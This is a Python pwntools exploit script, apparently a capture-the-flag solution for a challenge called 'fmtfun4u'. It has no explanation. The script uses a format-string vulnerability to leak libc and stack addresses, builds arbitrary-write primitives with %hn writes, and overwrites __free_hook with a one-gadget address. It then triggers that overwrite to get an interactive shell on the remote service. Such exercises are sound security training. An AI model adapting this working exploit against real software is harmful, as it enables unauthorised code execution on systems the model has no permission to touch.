#!/usr/bin/env python

from pwn import *

r = remote("csie.ctf.tw", 10136)
#r = process('./fmtfun4u', env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")})
context.arch = 'amd64'

def fmt(pre, val, idx, byte):
    if pre < val:
        res = '%{}c'.format(val - pre)
    elif pre == val:
        res = ''
    else:
        res = '%{}c'.format(val - pre + 256 ** byte)
    form = {1: 'hhn', 2: 'hn', 4: 'n'}
    res += '%{}${}'.format(idx, form[byte])
    return res

def crack(payload):
    # log.info('payload length: {}'.format(len(payload)))
    r.sendafter(':', payload)
    return r.recvline()[:-1]

def write_any(argv, target, val):
    crack(fmt(0, argv & 0xffff, 25, 2))
    crack(fmt(0, target & 0xffff, 39, 2))
    crack(fmt(0, (argv + 2) & 0xffff, 25, 2))
    crack(fmt(0, (target >> 16) & 0xffff, 39, 2))
    crack(fmt(0, (argv + 4) & 0xffff, 25, 2))
    crack(fmt(0, (target >> 32) & 0xffff, 39, 2))
    crack(fmt(0, val, 37, 2))

# raw_input('#')

libc = crack('%9$p')
libc = int(libc, 16) - 240 - 0x20740
log.info('address of libc base: {}'.format(hex(libc)))
free_hook = libc + 0x3c67a8
log.info('address of free_hook: {}'.format(hex(free_hook)))
argv = crack('%11$p')
log.info('address of argv: {}'.format(argv))
argv = int(argv, 16)
i_addr = argv - 236
log.info('address of i: {}'.format(hex(i_addr)))
crack(fmt(0, i_addr & 0xffff, 11, 2))
crack(fmt(0, 255, 37, 1))

magic_gadget = libc + 0xf0274

write_any(argv, free_hook, magic_gadget & 0xffff)
write_any(argv, free_hook + 2, (magic_gadget >> 16) & 0xffff)
write_any(argv, free_hook + 4, (magic_gadget >> 32) & 0xffff)

r.sendafter(':', "%65537c")

r.interactive()
